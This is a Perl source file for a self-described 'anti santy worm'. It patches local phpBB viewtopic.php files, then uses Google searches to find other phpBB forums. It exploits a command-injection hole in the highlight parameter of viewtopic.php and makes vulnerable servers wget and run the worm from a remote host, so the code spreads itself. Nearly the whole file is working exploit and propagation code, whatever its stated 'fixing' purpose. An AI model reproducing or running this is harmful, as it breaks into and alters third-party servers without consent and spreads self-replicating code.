   # asw:  anti santy worm
   # this worm will try to fix any viewtopic.php on local box
   # will use this box for 1 day to search other buggy phpBB forums, and end.

   use strict;
   use IO::Socket;
   use IO::Handle;

   sub fetch();
   sub remote($);
   sub http_query($);
   sub encode($);

   sub fetch(){
       my $rnd=(int(rand(9999)));
       my $n= 50;
       if ($rnd<5000) { $n<<=1;}
       my $s= (int(rand(10)) * $n);

       my @str=("%22Powered+by+phpBB%22+",
            "%22View+previous+topic+::+View+next+topic%22+",
            "%22post+new+topics+in+this+forum%22+",
            "%22reply+to+topics+in+this+forum%22+",
            "%22edit+your+posts+in+this+forum%22+",
            "%22delete+your+posts+in+this+forum%22+",
            "%22vote+in+polls+in+this+forum%22+",
            "%22Post+subject%22+phpBB+");

       my $query="www.google.com.ar/search?q=";
       $query.=$str[(rand(scalar(@str)))].$rnd;
       $query.="+-modules&num=$n&start=$s";

       my @lst=();
       my $page = http_query($query);
       while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"?>/g){
       if ($1 !~ m/google|cache|translate/){
           push (@lst,$1);
       }
       }
       return (@lst);
   }

   sub http_query($){
       my ($url) = @_;
       my $host=$url;
       my $query=$url;
       my $page="";
       $host =~ s/href=\"?http:\/\///;
       $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
       $query =~s/$host//;
       if ($query eq "") {$query="/";};
       eval {
       local $SIG{ALRM} = sub { die "1";};
       alarm 10;
       my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
       print $sock "GET $query HTTP/1.0\nHost: $host\nAccept: */*\nUser-Agent: Mozilla/4.0\n\n ";
       my @r = <$sock>;
       $page="@r";
       alarm 0;
       close($sock);
       };
       return $page;

   }

   sub encode($) {
       my $s = shift;
       $s =~ s/(.)/"chr(".ord($1).")%252E"/seg;
       $s =~ s/%252E$//;
       return $s;
   }


   if (-e "log.txt") {exit;}
   eval {fork and exit;};

   $|++;
   open LOG,">>log.txt";
   autoflush LOG 1;
   srand;
   my $iam=$ARGV[0];
   my $oneday=time+86400;
   my $page="";
   my @urls;
   my $url;


   ## first fix viewtopic to aviod future attacks
   my @in=`find / -name  "viewtopic.php" 2>/dev/null`;
   foreach my $f (@in){
       chop $f;
       my $newvt="";
       if (open FIX,"<$f") {
       print LOG "\nReading: $f ";
       while (<FIX>){
           $newvt.=$_;
       }
       close FIX;
       $newvt =~ s/urldecode//;
       if (open FIX,">$f"){
           print FIX $newvt;
           close FIX;
           print LOG " <--Fixed";
       }
       }
   }
   print LOG "\n";


   while(time<$oneday){
       @urls=fetch();
       foreach $url (@urls) {
       if ($url !~ /viewtopic.php/) {next;}
       $url =~ s/(.*\/viewtopic.php\?[t|p]=[0-9]+).*/$1/;
       print LOG "chk ".$url." ";
       my $cmd=encode("perl -e \"print q(jSVowMsd)\"");
       $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
       $page = http_query($url);
       if ( $page =~ /jSVowMsd/ ){
           $url =~ s/&highlight.*//;
           my $upload=$url;
           $upload =~ s/viewtopic.*//;
           print LOG ">bug viewtopic found ";
           $cmd="wget $iam/$0; perl $0 $upload;";    # set cmd
           $cmd=encode("$cmd");    # set cmd
           $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
           $page = http_query($url);

           $cmd="cd /tmp; wget $iam/$0; perl $0 $iam;";    # set cmd
           $cmd=encode("$cmd");    # set cmd
           $url =~ s/&highlight.*//;
           $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
           $page = http_query($url);
           print LOG ">done\n";
       }
       else {
           print LOG ">viewtopic ok\n";
       }
       }
   }
   close LOG;
